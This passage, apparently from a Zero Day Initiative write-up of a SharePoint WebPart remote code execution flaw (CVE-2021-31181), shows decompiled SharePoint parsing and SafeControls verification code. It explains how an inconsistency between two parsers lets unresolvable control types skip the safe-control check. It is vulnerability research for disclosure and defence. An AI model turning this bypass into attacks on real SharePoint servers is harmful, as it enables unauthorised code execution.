        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC11" class="blob-code blob-code-inner js-file-line">        <span class="pl-s1">ULS</span><span class="pl-kos">.</span><span class="pl-en">SendTraceTag</span><span class="pl-kos">(</span><span class="pl-c1">42059668u</span><span class="pl-kos">,</span> <span class="pl-s1">ULSCat</span><span class="pl-kos">.</span><span class="pl-s1">msoulscat_WSS_General</span><span class="pl-kos">,</span> <span class="pl-s1">ULSTraceLevel</span><span class="pl-kos">.</span><span class="pl-s1">Medium</span><span class="pl-kos">,</span> <span class="pl-s">"VerifyControlOnSafeList: Blocking control XML due to unsafe server side includes"</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L12" class="blob-num js-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC12" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">throw</span> <span class="pl-k">new</span> <span class="pl-smi">ArgumentException</span><span class="pl-kos">(</span><span class="pl-s">"Unsafe server-side includes"</span><span class="pl-kos">,</span> <span class="pl-s">"dscXml"</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L13" class="blob-num js-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC13" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L14" class="blob-num js-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC14" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">foreach</span> <span class="pl-kos">(</span><span class="pl-smi">object</span> <span class="pl-s1">obj</span> <span class="pl-k">in</span> <span class="pl-s1">hashtable2</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L15" class="blob-num js-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC15" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L16" class="blob-num js-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC16" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">Pair</span> <span class="pl-s1">pair</span> <span class="pl-c1">=</span> <span class="pl-kos">(</span><span class="pl-smi">Pair</span><span class="pl-kos">)</span><span class="pl-kos">(</span><span class="pl-kos">(</span><span class="pl-smi">DictionaryEntry</span><span class="pl-kos">)</span><span class="pl-s1">obj</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-s1">Value</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L17" class="blob-num js-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC17" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">string</span> <span class="pl-s1">text</span> <span class="pl-c1">=</span> <span class="pl-kos">(</span><span class="pl-smi">string</span><span class="pl-kos">)</span><span class="pl-s1">pair</span><span class="pl-kos">.</span><span class="pl-s1">First</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L18" class="blob-num js-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC18" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">string</span> <span class="pl-s1">text2</span> <span class="pl-c1">=</span> <span class="pl-kos">(</span><span class="pl-smi">string</span><span class="pl-kos">)</span><span class="pl-s1">pair</span><span class="pl-kos">.</span><span class="pl-s1">Second</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L19" class="blob-num js-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC19" class="blob-code blob-code-inner js-file-line">        <span class="pl-s1">text2</span> <span class="pl-c1">=</span> <span class="pl-s1">text2</span><span class="pl-kos">.</span><span class="pl-en">ToLower</span><span class="pl-kos">(</span><span class="pl-s1">CultureInfo</span><span class="pl-kos">.</span><span class="pl-s1">InvariantCulture</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L20" class="blob-num js-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC20" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-s1">hashtable</span><span class="pl-kos">.</span><span class="pl-en">ContainsKey</span><span class="pl-kos">(</span><span class="pl-s1">text2</span><span class="pl-kos">)</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L21" class="blob-num js-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC21" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L22" class="blob-num js-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC22" class="blob-code blob-code-inner js-file-line">            <span class="pl-smi">ArrayList</span> <span class="pl-s1">arrayList</span> <span class="pl-c1">=</span> <span class="pl-kos">(</span><span class="pl-smi">ArrayList</span><span class="pl-kos">)</span><span class="pl-s1">hashtable</span><span class="pl-kos">[</span><span class="pl-s1">text2</span><span class="pl-kos">]</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L23" class="blob-num js-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC23" class="blob-code blob-code-inner js-file-line">            <span class="pl-smi">string</span> <span class="pl-s1">s</span> <span class="pl-c1">=</span> <span class="pl-c1">null</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L24" class="blob-num js-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC24" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">foreach</span> <span class="pl-kos">(</span><span class="pl-smi">object</span> <span class="pl-s1">obj2</span> <span class="pl-k">in</span> <span class="pl-s1">arrayList</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L25" class="blob-num js-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC25" class="blob-code blob-code-inner js-file-line">            <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L26" class="blob-num js-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC26" class="blob-code blob-code-inner js-file-line">                <span class="pl-smi">Triplet</span> <span class="pl-s1">triplet</span> <span class="pl-c1">=</span> <span class="pl-kos">(</span><span class="pl-smi">Triplet</span><span class="pl-kos">)</span><span class="pl-s1">obj2</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L27" class="blob-num js-line-number js-blob-rnum" data-line-number="27"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC27" class="blob-code blob-code-inner js-file-line">                <span class="pl-smi">string</span> <span class="pl-s1">text3</span> <span class="pl-c1">=</span> <span class="pl-kos">(</span><span class="pl-smi">string</span><span class="pl-kos">)</span><span class="pl-s1">triplet</span><span class="pl-kos">.</span><span class="pl-s1">Third</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L28" class="blob-num js-line-number js-blob-rnum" data-line-number="28"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC28" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-c1">!</span><span class="pl-smi">string</span><span class="pl-kos">.</span><span class="pl-en">IsNullOrEmpty</span><span class="pl-kos">(</span><span class="pl-s1">text3</span><span class="pl-kos">)</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L29" class="blob-num js-line-number js-blob-rnum" data-line-number="29"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC29" class="blob-code blob-code-inner js-file-line">                <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L30" class="blob-num js-line-number js-blob-rnum" data-line-number="30"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC30" class="blob-code blob-code-inner js-file-line"><span class="pl-c">/*...*/</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L31" class="blob-num js-line-number js-blob-rnum" data-line-number="31"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC31" class="blob-code blob-code-inner js-file-line">                <span class="pl-s1">else</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L32" class="blob-num js-line-number js-blob-rnum" data-line-number="32"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC32" class="blob-code blob-code-inner js-file-line">                <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L33" class="blob-num js-line-number js-blob-rnum" data-line-number="33"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC33" class="blob-code blob-code-inner js-file-line">                    <span class="pl-smi">string</span> <span class="pl-s1">typeFullName</span> <span class="pl-c1">=</span> <span class="pl-kos">(</span><span class="pl-smi">string</span><span class="pl-kos">)</span><span class="pl-s1">triplet</span><span class="pl-kos">.</span><span class="pl-s1">First</span> <span class="pl-c1">+</span> <span class="pl-s">"."</span> <span class="pl-c1">+</span> <span class="pl-s1">text</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L34" class="blob-num js-line-number js-blob-rnum" data-line-number="34"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC34" class="blob-code blob-code-inner js-file-line">                    <span class="pl-smi">string</span> <span class="pl-s1">assemblyQualifiedName</span> <span class="pl-c1">=</span> <span class="pl-kos">(</span><span class="pl-smi">string</span><span class="pl-kos">)</span><span class="pl-s1">triplet</span><span class="pl-kos">.</span><span class="pl-s1">Second</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L35" class="blob-num js-line-number js-blob-rnum" data-line-number="35"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC35" class="blob-code blob-code-inner js-file-line">                    <span class="pl-smi">Type</span> <span class="pl-s1">type</span> <span class="pl-c1">=</span> <span class="pl-c1">null</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L36" class="blob-num js-line-number js-blob-rnum" data-line-number="36"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC36" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">try</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L37" class="blob-num js-line-number js-blob-rnum" data-line-number="37"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC37" class="blob-code blob-code-inner js-file-line">                    <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L38" class="blob-num js-line-number js-blob-rnum" data-line-number="38"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC38" class="blob-code blob-code-inner js-file-line">                        <span class="pl-s1">type</span> <span class="pl-c1">=</span> <span class="pl-s1">PageParser</span><span class="pl-kos">.</span><span class="pl-en">GetControlType</span><span class="pl-kos">(</span><span class="pl-s1">assemblyQualifiedName</span><span class="pl-kos">,</span> <span class="pl-s1">typeFullName</span><span class="pl-kos">,</span> <span class="pl-c1">true</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L39" class="blob-num js-line-number js-blob-rnum" data-line-number="39"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC39" class="blob-code blob-code-inner js-file-line">                    <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L40" class="blob-num js-line-number js-blob-rnum" data-line-number="40"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC40" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">catch</span> <span class="pl-kos">(</span><span class="pl-smi">TypeLoadException</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L41" class="blob-num js-line-number js-blob-rnum" data-line-number="41"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC41" class="blob-code blob-code-inner js-file-line">                    <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L42" class="blob-num js-line-number js-blob-rnum" data-line-number="42"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC42" class="blob-code blob-code-inner js-file-line">                        <span class="pl-k">continue</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L43" class="blob-num js-line-number js-blob-rnum" data-line-number="43"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC43" class="blob-code blob-code-inner js-file-line">                    <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L44" class="blob-num js-line-number js-blob-rnum" data-line-number="44"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC44" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-c1">!</span><span class="pl-s1">web</span><span class="pl-kos">.</span><span class="pl-s1">SafeControls</span><span class="pl-kos">.</span><span class="pl-en">IsSafeControl</span><span class="pl-kos">(</span><span class="pl-s1">web</span><span class="pl-kos">.</span><span class="pl-s1">IsAppWeb</span><span class="pl-kos">,</span> <span class="pl-s1">type</span><span class="pl-kos">,</span> <span class="pl-k">out</span> <span class="pl-s1">s</span><span class="pl-kos">)</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L45" class="blob-num js-line-number js-blob-rnum" data-line-number="45"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC45" class="blob-code blob-code-inner js-file-line">                    <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L46" class="blob-num js-line-number js-blob-rnum" data-line-number="46"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC46" class="blob-code blob-code-inner js-file-line">                        <span class="pl-k">throw</span> <span class="pl-k">new</span> <span class="pl-s1">SafeControls</span><span class="pl-kos">.</span><span class="pl-s1">UnsafeControlException</span><span class="pl-kos">(</span><span class="pl-s1">s</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L47" class="blob-num js-line-number js-blob-rnum" data-line-number="47"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC47" class="blob-code blob-code-inner js-file-line">                    <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L48" class="blob-num js-line-number js-blob-rnum" data-line-number="48"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC48" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">break</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L49" class="blob-num js-line-number js-blob-rnum" data-line-number="49"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC49" class="blob-code blob-code-inner js-file-line">                <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L50" class="blob-num js-line-number js-blob-rnum" data-line-number="50"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC50" class="blob-code blob-code-inner js-file-line">            <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L51" class="blob-num js-line-number js-blob-rnum" data-line-number="51"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC51" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L52" class="blob-num js-line-number js-blob-rnum" data-line-number="52"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC52" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L53" class="blob-num js-line-number js-blob-rnum" data-line-number="53"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC53" class="blob-code blob-code-inner js-file-line"><span class="pl-kos">}</span></td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/zdi-team/133951a87d0103c3809359f4aa482a77/raw/d69f651c041a07ac3e56fcd785b9b26991ff84eb/CVE-2021-31181-snippet-2.cs" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/zdi-team/133951a87d0103c3809359f4aa482a77#file-cve-2021-31181-snippet-2-cs" class="Link--inTextBlock">
          CVE-2021-31181-snippet-2.cs
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1622577090871_23940"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;"><strong><em>EditingPageParser.ParseStringInternal()</em></strong> parses user input (<strong><em>dscXml)</em></strong> and populates <strong><em>hashtable</em></strong> with information from <strong>Register</strong> directives and <strong><em>hashtable2 </em></strong>with values from tags that represent server controls. In the next step, it tries to create a <strong>Type </strong>object for each element from <strong><em>hashtable2</em></strong> and checks it against an allowed list of <strong>SafeControls</strong>. However, it will ignore the tag of the server control if the <strong>Type</strong> cannot be resolved. Normally, this would not create a hazard. If a <strong>Type</strong> cannot be resolved at the verification stage, then it should similarly fail to resolve later during the actual processing of markup. However, an inconsistency between the code in <strong><em>EditingPageParser</em></strong> and <strong><em>TemplateParser</em></strong> breaks this assumption.</p><p class="" style="white-space:pre-wrap;">Let’s look closer at how the values in <strong><em>hashtable</em></strong> are populated, and let’s pay attention to the <strong>namespace</strong> attribute of the <strong>Register</strong> directive: </p>
</div>






















</div></div><div class="sqs-block embed-block sqs-block-embed" data-block-json="{&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;html&quot;:&quot;&lt;script src=\&quot;https://gist.github.com/76530cf7c3c564be77611553b099f84c.js\&quot;&gt;&lt;/script&gt;&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1622577090871_34592"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_74" style="visibility: visible; opacity: 1; height: auto;"><script src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/76530cf7c3c564be77611553b099f84c..download"></script><link rel="stylesheet" href="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/gist-embed-0ac919313390.css"><div id="gist109841063" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-cve-2021-31181-snippet-3-cs" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="CVE-2021-31181-snippet-3.cs content, created by zdi-team on 02:59PM on June 01, 2021.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="CVE-2021-31181-snippet-3.cs">
        <tbody><tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-c">// Microsoft.SharePoint.EditingPageParser </span></td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-k">private</span> <span class="pl-k"><span class="pl-k">static</span></span> <span class="pl-smi">void</span> <span class="pl-s1">ParseStringInternal</span><span class="pl-kos">(</span><span class="pl-smi">string</span> <span class="pl-s1">text</span><span class="pl-kos">,</span> <span class="pl-s1">System</span><span class="pl-kos">.</span><span class="pl-s1">Collections</span><span class="pl-kos">.</span><span class="pl-s1">Hashtable</span> <span class="pl-s1">controls</span><span class="pl-kos">,</span> <span class="pl-s1">System</span><span class="pl-kos">.</span><span class="pl-s1">Collections</span><span class="pl-kos">.</span><span class="pl-s1">Hashtable</span> <span class="pl-s1">typeNames</span><span class="pl-kos">,</span> <span class="pl-s1">System</span><span class="pl-kos">.</span><span class="pl-s1">Collections</span><span class="pl-kos">.</span><span class="pl-s1">Generic</span><span class="pl-kos">.</span><span class="pl-smi">IList</span><span class="pl-c1">&lt;</span><span class="pl-smi">string</span><span class="pl-c1">&gt;</span> <span class="pl-s1">includes</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC3" class="blob-code blob-code-inner js-file-line"><span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC4" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">int</span> <span class="pl-s1">num</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC5" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">int</span> <span class="pl-s1">num2</span> <span class="pl-c1">=</span> <span class="pl-s1">text</span><span class="pl-kos">.</span><span class="pl-en">LastIndexOf</span><span class="pl-kos">(</span><span class="pl-s">'&gt;'</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC6" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">while</span> <span class="pl-kos">(</span><span class="pl-c1">true</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC7" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC8" class="blob-code blob-code-inner js-file-line">        <span class="pl-s1">System</span><span class="pl-kos">.</span><span class="pl-s1">Text</span><span class="pl-kos">.</span><span class="pl-s1">RegularExpressions</span><span class="pl-kos">.</span><span class="pl-s1">Match</span> <span class="pl-s1">match</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC9" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-kos">(</span><span class="pl-s1">match</span> <span class="pl-c1">=</span> <span class="pl-s1">EditingPageParser</span><span class="pl-kos">.</span><span class="pl-s1">textRegex</span><span class="pl-kos">.</span><span class="pl-en">Match</span><span class="pl-kos">(</span><span class="pl-s1">text</span><span class="pl-kos">,</span> <span class="pl-s1">num</span><span class="pl-kos">)</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-s1">Success</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC10" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC11" class="blob-code blob-code-inner js-file-line">            <span class="pl-s1">num</span> <span class="pl-c1">=</span> <span class="pl-s1">match</span><span class="pl-kos">.</span><span class="pl-s1">Index</span> <span class="pl-c1">+</span> <span class="pl-s1">match</span><span class="pl-kos">.</span><span class="pl-s1">Length</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L12" class="blob-num js-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC12" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L13" class="blob-num js-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC13" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-s1">num</span> <span class="pl-c1">==</span> <span class="pl-s1">text</span><span class="pl-kos">.</span><span class="pl-s1">Length</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L14" class="blob-num js-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC14" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L15" class="blob-num js-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC15" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">break</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L16" class="blob-num js-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC16" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L17" class="blob-num js-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC17" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">bool</span> <span class="pl-s1">flag</span> <span class="pl-c1">=</span> <span class="pl-c1">false</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L18" class="blob-num js-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC18" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-kos">(</span><span class="pl-s1">match</span> <span class="pl-c1">=</span> <span class="pl-s1">EditingPageParser</span><span class="pl-kos">.</span><span class="pl-s1">directiveRegex</span><span class="pl-kos">.</span><span class="pl-en">Match</span><span class="pl-kos">(</span><span class="pl-s1">text</span><span class="pl-kos">,</span> <span class="pl-s1">num</span><span class="pl-kos">)</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-s1">Success</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L19" class="blob-num js-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC19" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L20" class="blob-num js-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC20" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">try</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L21" class="blob-num js-line-number js-blob-rnum" data-line-number="21"></td>
